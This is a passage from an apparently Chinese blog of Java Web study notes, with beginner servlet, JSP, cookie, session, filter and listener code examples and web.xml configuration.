class="hljs-string">&quot;get&quot;</span>&gt;</span></span><span class="language-xml">    用户 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span></span><span class="language-xml">    密码 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> javax.servlet.<span class="hljs-type">ServletException</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServlet</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletRequest</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletResponse</span>;<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">IOException</span>;public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedirectServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-type">String</span> username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);        <span class="hljs-type">String</span> password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);        <span class="hljs-type">System</span>.out.println(username+<span class="hljs-string">&quot;:&quot;</span>+password);        resp.sendRedirect(<span class="hljs-string">&quot;/hello/success.jsp&quot;</span>);    <span class="hljs-comment">//要包含页面设置时的虚拟映射</span>    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-keyword">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><p><code>req.getRequestDispatcher(&quot;success.jsp&quot;).forward(req,resp);</code>请求路径已经在虚拟映射的路径下了，不用再写虚拟映射的路径，另外这里<code>success.jsp</code>加不加<code>/</code>是一样的</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.Arrays;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedirectServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);        String[] hobbys = req.getParameterValues(<span class="hljs-string">&quot;hobbys&quot;</span>);        System.out.println(hobbys);        System.out.println(Arrays.toString(hobbys));        System.out.println(username+<span class="hljs-string">&quot;:&quot;</span>+password);        System.out.println(req.getContextPath());<span class="hljs-comment">//        resp.sendRedirect(&quot;/hello/success.jsp&quot;);</span>        req.getRequestDispatcher(<span class="hljs-string">&quot;success.jsp&quot;</span>).forward(req,resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><h2 id="cookie-客户端携带"><a href="#cookie-客户端携带" class="headerlink" title="cookie  (客户端携带)"></a>cookie  (客户端携带)</h2><ul><li>一个cookie只能保存一个信息</li><li>一个web站点可以给浏览器发送多个cookie，最多存放20个cookie</li><li>cookie大小有限制4kb</li><li>300个cookie浏览器上限</li></ul><p>删除cookie</p><ul><li>不设置有效期</li><li>设置有效期为0</li></ul><p>传递中文</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLEncoder</span>.</span></span>encode(<span class="hljs-string">&quot;啊啊啊&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLDecoder</span>.</span></span>decode(cookie.get<span class="hljs-constructor">Value()</span>,<span class="hljs-string">&quot;utf-8&quot;</span>)</code></pre></div><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>什么是session:</p><ul><li>服务器会给浏览器创建一个session对象</li><li>一个session独占一个浏览器，只要浏览器没有关闭，这个session就存在</li><li>用户登陆之后，整个网站他都可以访问</li></ul><p>session和cookie的区别</p><p>cookie是把用户的数据写到用户的浏览器中，可以保存多个cookie</p><p>session是把用户的数据写到用户独占的session中，服务器端保存（保存重要的信息，减少服务器资源的浪费）</p><p>session对象由服务器创建</p><div class="code-wrapper"><pre><code class="hljs stylus">session创建的逻辑实际上是Cookie cookie = new <span class="hljs-built_in">cookie</span>(<span class="hljs-string">&quot;JSESSIONID&quot;</span>,id)<span class="hljs-function"><span class="hljs-title">addCookie</span><span class="hljs-params">(cookie)</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java">req.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);resp.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);resp.setContentType(<span class="hljs-string">&quot;text/plain;charset=utf-8&quot;</span>);<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> req.getSession();session.setAttribute(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;zeropeach&quot;</span>);<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> session.getId();writer.println(<span class="hljs-string">&quot;session的id为&quot;</span>+id);<span class="hljs-comment">//判断是不是新创建的session，只有当session被销毁时才会重新自动生成</span>writer.println(session.isNew());<span class="hljs-comment">//获取session内容</span><span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> req.getSession();<span class="hljs-type">Object</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;name&quot;</span>);System.out.println(name.toString());<span class="hljs-comment">//销毁session</span><span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> req.getSession();session.removeAttribute(<span class="hljs-string">&quot;name&quot;</span>);session.invalidate();</code></pre></div><p>当有两个sessionid时，session不能共享对象，可以通过ServletContext（也叫ApplicationContext）</p><p><img src="/../images/javaweb/image-20231219174850119.png" alt="image-20231219174850119"></p><h2 id="jsp原理"><a href="#jsp原理" class="headerlink" title="jsp原理"></a>jsp原理</h2><p>全称 Java Servlet Pages</p><p>说明也是一个java程序，是一个servlet</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\idea_2022.<span class="hljs-number">3</span>\.IntelliJIdea\system\tomcat\<span class="hljs-number">81</span>de8c7e-<span class="hljs-number">5</span>d87-<span class="hljs-number">4185</span>-<span class="hljs-number">9841</span>-<span class="hljs-number">7</span>ba31aa3bac6\work\Catalina\localhost\hello\org\apache\jsp</code></pre></div><p><img src="/../images/javaweb/image-20231219182727934.png" alt="image-20231219182727934"></p><p><img src="/../images/javaweb/image-20231219183705792.png" alt="image-20231219183705792"></p><h2 id="jsp语法"><a href="#jsp语法" class="headerlink" title="jsp语法"></a>jsp语法</h2><h3 id="热部署"><a href="#热部署" class="headerlink" title="热部署"></a>热部署</h3><p>要是exploded这个</p><p><img src="/../images/javaweb/image-20231219190327668.png" alt="image-20231219190327668"></p><p>然后改为这样既可</p><p><img src="/../images/javaweb/image-20231219190404430.png" alt="image-20231219190404430"></p><p>这样就不用每次重启tomcat，只需要刷新页面即可</p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><div class="code-wrapper"><pre><code class="hljs erlang-repl">&lt;<span class="hljs-comment">%--</span>&lt;<span class="hljs-comment">%= 变量或表达式%&gt;     用来输出</span>--<span class="hljs-comment">%&gt;</span>&lt;<span class="hljs-comment">%= new java.util.Date()%&gt;</span>&lt;<span class="hljs-comment">%</span>    int sum=<span class="hljs-number">0</span>;    for (int i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">100</span>; i++) &#123;        sum +=i;    &#125;    out.println(<span class="hljs-string">&quot;&lt;h1&gt;sum&quot;</span>+sum+<span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<span class="hljs-comment">%&gt;</span>&lt;<span class="hljs-comment">%</span>    int y = <span class="hljs-number">2</span>;<span class="hljs-comment">%&gt;</span>&lt;<span class="hljs-comment">%</span>    out.println(y);<span class="hljs-comment">%&gt;</span>&lt;<span class="hljs-comment">%</span>    for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<span class="hljs-comment">%&gt;</span>&lt;h1&gt;wow&lt;/h1&gt;&lt;<span class="hljs-comment">%</span>    &#125;<span class="hljs-comment">%&gt;</span></code></pre></div><p><img src="/../images/javaweb/image-20231219191031818.png" alt="image-20231219191031818"></p><p>因为本质就是java文件，所以能用java语法，作用域也是一样，于是可以配合<code>HTML</code>循环输出</p><h3 id="jsp声明"><a href="#jsp声明" class="headerlink" title="jsp声明"></a>jsp声明</h3><p>&lt;%! %&gt; 声明全局变量和全局方法</p><div class="code-wrapper"><pre><code class="hljs csharp">&lt;%!    <span class="hljs-keyword">static</span> &#123;        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;666&quot;</span>);    &#125;   <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> m = <span class="hljs-number">8848</span>;%&gt;</code></pre></div><p>使用声明后，后被写到java类的作用域下，与原方法同级</p><div class="code-wrapper"><pre><code class="hljs brainfuck">&lt;<span class="hljs-comment">%</span><span class="hljs-literal">--</span><span class="hljs-comment">注释</span><span class="hljs-literal">--</span><span class="hljs-comment">%</span>&gt;</code></pre></div><p>jsp的注释不会在客户端的源代码中出现</p><p>在jsp中加入这一句，遇到错误就跳转到500.jsp</p><div class="code-wrapper"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span>@ page errorPage=<span class="hljs-string">&quot;error/500.jsp&quot;</span> <span class="hljs-meta">%</span>&gt;       <span class="hljs-comment">//自定义错误页面</span></code></pre></div><p>也可以修改web.xml，当遇到404时，就会跳到404.jsp</p><div class="code-wrapper"><pre><code class="hljs gauss">&lt;<span class="hljs-built_in">error</span>-page&gt;    &lt;<span class="hljs-built_in">error</span>-<span class="hljs-built_in">code</span>&gt;<span class="hljs-number">404</span>&lt;/<span class="hljs-built_in">error</span>-<span class="hljs-built_in">code</span>&gt;    &lt;location&gt;/<span class="hljs-built_in">error</span>/<span class="hljs-number">404.</span>jsp&lt;/location&gt;&lt;/<span class="hljs-built_in">error</span>-page&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs gradle">页面内容合二为一&lt;%@<span class="hljs-keyword">include</span> <span class="hljs-keyword">file</span>=<span class="hljs-string">&quot;&quot;</span>%&gt;         <span class="hljs-comment">//文件包含</span>页面内容拼接，实际还是多个页面&lt;jsp:<span class="hljs-keyword">include</span> page=<span class="hljs-string">&quot;500.jsp&quot;</span> /&gt;</code></pre></div><h2 id="jsp-内置对象"><a href="#jsp-内置对象" class="headerlink" title="jsp 内置对象"></a>jsp 内置对象</h2><div class="code-wrapper"><pre><code class="hljs javascript">&lt;%    pageContext.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;name1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);   <span class="hljs-comment">//保存的数据只在一个页面中有效</span>    request.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;name2&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>);    <span class="hljs-comment">//只在一次请求中有效，请求转发会携带这个数据</span>    session.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;name3&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>);    <span class="hljs-comment">//只在一次会话中有效，从打开浏览器到关闭浏览器</span>    application.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;name4&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>);   <span class="hljs-comment">//在服务器中有效 ，从打开服务器到关闭服务器</span>%&gt;&lt;%    <span class="hljs-title class_">String</span> name1 = (<span class="hljs-title class_">String</span>) pageContext.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;name1&quot;</span>);    <span class="hljs-title class_">String</span> name2 = (<span class="hljs-title class_">String</span>) pageContext.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;name2&quot;</span>);    <span class="hljs-title class_">String</span> name3 = (<span class="hljs-title class_">String</span>) pageContext.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;name3&quot;</span>);    <span class="hljs-title class_">String</span> name4 = (<span class="hljs-title class_">String</span>) pageContext.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;name4&quot;</span>);    <span class="hljs-title class_">String</span> name5 = (<span class="hljs-title class_">String</span>) pageContext.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;name5&quot;</span>);%&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>$&#123;name1&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>$&#123;name2&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>$&#123;name3&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>$&#123;name4&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span>&lt;%=name5%&gt;</code></pre></div><h2 id="双亲委派机制-（与作用域进行类比）"><a href="#双亲委派机制-（与作用域进行类比）" class="headerlink" title="双亲委派机制 （与作用域进行类比）"></a>双亲委派机制 （与作用域进行类比）</h2><p>想要重写一个类，但加载时会在类加载器中不断地往上找，在最上面加载器中找到的话，只会使用根加载器的，不会使用你重写的</p><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p><img src="/../images/javaweb/image-20231219214300845.png" alt="image-20231219214300845"></p><p>指定作用域</p><div class="code-wrapper"><pre><code class="hljs llvm">&lt;<span class="hljs-variable">%pageContext.setAttribute</span>(<span class="hljs-string">&quot;name&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;123&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span>)<span class="hljs-comment">;%&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs vbscript-html"><span class="language-xml">//都是请求转发</span><span class="language-xml"></span><span class="language-xml"></span><span class="language-vbscript">&lt;%</span><span class="language-vbscript">    pageContext.forward(<span class="hljs-string">&quot;/hello/hello.jsp&quot;</span>);</span><span class="language-vbscript">    <span class="hljs-built_in">request</span>.getRequestDispatcher(<span class="hljs-string">&quot;/hello/hello.jsp&quot;</span>).forward(<span class="hljs-built_in">request</span>,<span class="hljs-built_in">response</span>);</span><span class="language-vbscript">%&gt;</span></code></pre></div><h2 id="MVC框架"><a href="#MVC框架" class="headerlink" title="MVC框架"></a>MVC框架</h2><p>Model </p><p>增删改查</p><p>view </p><p>controller</p><p><img src="/../images/javaweb/image-20231220153426022.png" alt="image-20231220153426022"></p><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><p>导入的包不要错 <code>javax.servlet.Filter</code></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;        System.out.println(<span class="hljs-string">&quot;初始化&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;        request.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        response.setContentType(<span class="hljs-string">&quot;text/plain;charset=utf-8&quot;</span>);        System.out.println(<span class="hljs-string">&quot;执行前&quot;</span>);        chain.doFilter(request,response);        System.out.println(<span class="hljs-string">&quot;执行后&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;销毁&quot;</span>);    &#125;&#125;</code></pre></div><p>web.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>TestFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><span class="hljs-comment">&lt;!--相对路径，不用包含映射--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span></code></pre></div><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><div class="code-wrapper"><pre><code class="hljs reasonml">import javax.servlet.ServletContext;import javax.servlet.http.HttpSessionEvent;import javax.servlet.http.HttpSessionListener;public <span class="hljs-keyword">class</span> OnlineListener implements HttpSessionListener &#123;    @Override    public void session<span class="hljs-constructor">Created(HttpSessionEvent <span class="hljs-params">se</span>)</span> &#123;        ServletContext context = se.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">ServletContext()</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(se.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">Id()</span>);        Integer count = (Integer) context.get<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;OnlineCount&quot;</span>)</span>;        <span class="hljs-keyword">if</span> (count==null)&#123;            count = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Integer(1)</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-built_in">int</span> i = count.<span class="hljs-built_in">int</span><span class="hljs-constructor">Value()</span>;            count = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Integer(<span class="hljs-params">i</span>+1)</span>;        &#125;        context.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;OnlineCount&quot;</span>,<span class="hljs-params">count</span>)</span>;    &#125;    @Override    public void session<span class="hljs-constructor">Destroyed(HttpSessionEvent <span class="hljs-params">se</span>)</span> &#123;        ServletContext context = se.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">ServletContext()</span>;        Integer count = (Integer) context.get<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;OnlineCount&quot;</span>)</span>;        <span class="hljs-keyword">if</span> (count==null)&#123;            count = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Integer(0)</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-built_in">int</span> i = count.<span class="hljs-built_in">int</span><span class="hljs-constructor">Value()</span>;            count = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Integer(<span class="hljs-params">i</span>-1)</span>;        &#125;        context.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;OnlineCount&quot;</span>,<span class="hljs-params">count</span>)</span>;    &#125;&#125;</code></pre></div><p>web.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>OnlineListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span></code></pre></div><h2 id="Filter权限管理案例"><a href="#Filter权限管理案例" class="headerlink" title="Filter权限管理案例"></a>Filter权限管理案例</h2><p>写的时候注意跳转的地方，我在写的时候写出个一直重定向的错误 。。。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SysFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;        <span class="hljs-type">Object</span> <span class="hljs-variable">userSession</span> <span class="hljs-operator">=</span> req.getSession().getAttribute(<span class="hljs-string">&quot;USER_SESSION&quot;</span>);        <span class="hljs-keyword">if</span> (userSession==<span class="hljs-literal">null</span>)&#123;            resp.sendRedirect(<span class="hljs-string">&quot;/hello/sys/error.jsp&quot;</span>);        &#125;        chain.doFilter(req,resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> javax.servlet.<span class="hljs-type">ServletException</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServlet</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletRequest</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletResponse</span>;<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">IOException</span>;public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-type">String</span> username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);        <span class="hljs-keyword">if</span> (username.equals(<span class="hljs-string">&quot;admin&quot;</span>))&#123;            req.getSession().setAttribute(<span class="hljs-string">&quot;USER_SESSION&quot;</span>,req.getSession().getId());            resp.sendRedirect(<span class="hljs-string">&quot;/hello/success.jsp&quot;</span>);        &#125;        <span class="hljs-keyword">else</span> &#123;            resp.sendRedirect(<span class="hljs-string">&quot;/hello/sys/error.jsp&quot;</span>);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-keyword">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> javax.servlet.<span class="hljs-type">ServletException</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServlet</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletRequest</span>;<span class="hljs-keyword">import</span> javax.servlet.http.<span class="hljs-type">HttpServletResponse</span>;<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">IOException</span>;public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogoutServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-type">Object</span> userSession = req.getSession().getAttribute(<span class="hljs-string">&quot;USER_SESSION&quot;</span>);        <span class="hljs-keyword">if</span> (userSession!=<span class="hljs-literal">null</span>)&#123;            req.getSession().removeAttribute(<span class="hljs-string">&quot;USER_SESSION&quot;</span>);            resp.sendRedirect(<span class="hljs-string">&quot;/hello/sys/login.jsp&quot;</span>);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-keyword">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>LoginServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/sys/login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span 